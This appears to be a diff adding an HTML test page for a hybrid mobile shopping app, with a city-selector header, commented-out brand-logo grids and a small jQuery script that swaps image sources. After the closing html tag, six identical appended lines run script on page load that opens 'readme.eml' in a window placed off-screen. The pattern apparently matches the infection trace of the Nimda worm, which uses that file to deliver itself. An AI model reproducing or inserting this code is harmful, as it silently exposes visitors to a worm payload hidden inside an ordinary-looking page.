@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html class="ui-mobile landscape min-width-240px min-width-320px min-width-480px min-width-768px min-width-1024px">
+  <head>
+    <title>
+    </title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" href="css/common.css">
+    <script src="js/zy_anim.js"></script>
+    <script src="js/zy_control.js"></script>
+ 	<script src="js/zy_tmpl.js"></script>
+ 	<script src="js/zyflip.js"></script>
+ 	<script src="js/jquery.js"></script>
+ 	<script src="js/jQueryRotateCompressed.2.1.js"></script>
+ 	<script src="js/jquery.path.js"></script>
+ 	<script src="js/common.js"></script>
+ 	<script src="js/lazyimg.js"></script>
+  </head>
+   <style>
+   	.check{border-radius:25px;}
+   	.uncheck{border-radius:0px;}
+   	.check2{opacity:0.2;}
+   	.uncheck2{opacity:1;}
+    .logo_order{position:absolute;bottom:0;right:0;background: url("css/images1/xz.png") no-repeat;width:50px;height:50px;}
+	.logo_order_check{display:inline-block;opacity:1;}
+	.logo_order_uncheck{display:inline-block;opacity:0;}
+   </style>
+  <body class="body" >
+<!--header开始-->
+<div id="header" class="header">
+	<div  data-role="header" class="header_main">
+		<div class="title" id="cityName_point">
+			<div class="title_select"  ontouchstart="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'city-hot\',\'util/city-hot.html?from=home\');closeMenu();');">
+				<span class="title_text_l" id="cityName"></span>
+				<span class="btn btn_triangle" ></span>
+			</div>
+		</div>
+		<div ontouchstart="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'order-list\',\'order/order-list.html\');closeMenu();');" class="btn btn_head btn_head_r btn_head_order"></div>
+	</div>
+	<div class="header_border_20"></div>
+</div>
+	<!--header结束-->
+		<!--content开始-->
+	<div id="page_0" class="content" tabindex="0">
+<!-- 			<div id="a2" class="movearea movearea_active">
+		 	 <section>
+				<ul>
+					<li onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'brand-list\',\'brand/brand-list.html\',0)');">
+						<div class="logo_body">
+							<img class="logo" src="css/images1/addlogo.png"/>
+							<span class="logo_num logo_num_loc">37</span>
+							<div class="flag_check hide logo_order logo_order_check"></div>
+							<div class="bg_text">阿迪达斯</div>
+						</div>
+					</li><li class='liM' onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'cardfav-list\',\'creditcard/cardfav-list.html\',0)');">
+					<div class="logo_body">
+						<img class="logo" src="images/nhx.png" />
+						<span class="logo_num logo_num_loc">38</span>
+						<div class="bg_text">建设银行</div>
+						</div>
+					</li><li onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'brand-list\',\'brand/brand-list.html\',0)');">
+					<div class="logo_body">
+						<img class="logo" src="images/logo3.png" />
+						<span class="logo_num logo_num_loc">39</span>
+						<div class="bg_text">肯德基</div>
+						</div>
+					</li><li onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'order-list\',\'order/order-list.html\',0)');"><img class="logo" src="css/images1/addlogo.png"/></li>
+				</ul>
+				</section>  
+				 <section>
+				<ul>
+					<li onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'order-list\',\'order/order-list.html\',0)');"><img class="logo" src="css/images/addlogo.png"/></li>
+				</ul>
+				</section> 
+			</div>
+			<div class="page_point">
+				<ul id="curpage">
+				</ul>
+			</div> -->
+			<!-- <div id="a1">
+				<div onclick="test()" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="changepoint3(this)" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+				<div onclick="changepoint(this)" style="display:inline-block;background:blue;width:100px;height:100px;"></div>
+				<div onclick="changepoint2(this)"  style="display:inline-block;background:yellow;width:100px;height:100px;"></div>
+				<div onclick="test()" style="display:inline-block;background:red;width:100px;height:100px;position:relative;"><span class="logo_order"></span></div>
+			</div> -->
+			
+			<div id="wrap"><img src="icon.png" id="txt"/>sasdfsdfsdf</div>
+			<input value="初始化" type="button" onclick="init();">
+			<input value="移除后" type="button" onclick="afterRemove();">
+	</div>
+	<!--content结束-->
+	<div id="footer" data-role="footer" class="">
+</div>
+  </body>
+<script>
+var a = new zyFlip("a1","H","","","");
+
+	zy_fix("header",null,0,function()
+	{
+		/*请在此插入网页初始化代码*/
+	/* 	COM.IMGLOAD.initPage();
+		COM.UTILS.initLocation();
+		toLoadData();
+		COM.UTILS.mainPageReturnKeySet(); */
+		
+	});
+	var txtObj;
+	function init(){
+		txtObj = $("#txt");
+		alert(txtObj.attr("src"));
+	}
+	function afterRemove(){
+		alert("exec afterRemove");
+		$("#wrap").html("");
+		alert(txtObj.attr("src"));
+		txtObj.attr("src","css/pull-icon@2x.png");
+		alert(txtObj.attr("src"));
+	}
+	setTimeout(function(){
+		var vdata = zy_parse();
+	},1000);
+	function test(){
+		alert(vdata.index);		
+	}
+	function changepoint(obj){
+		var test = obj;
+		if($(test).hasClass("check")){
+			$(test).removeClass("check").addClass("uncheck");			
+		}else{
+			$(test).removeClass("uncheck").addClass("check");			
+		}
+	}
+	function changepoint2(obj){
+		var test = obj;
+		if($(test).hasClass("check2")){
+			$(test).removeClass("check2").addClass("uncheck2");			
+		}else{
+			$(test).removeClass("uncheck2").addClass("check2");			
+		}
+	}
+	function changepoint3(obj){
+		var test = obj;
+		if($(test).children().hasClass("logo_order_check")){
+			$(test).children().removeClass("logo_order_check").addClass("logo_order_uncheck");			
+		}else{
+			$(test).children().removeClass("logo_order_uncheck").addClass("logo_order_check");			
+		}
+	}
+</script>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
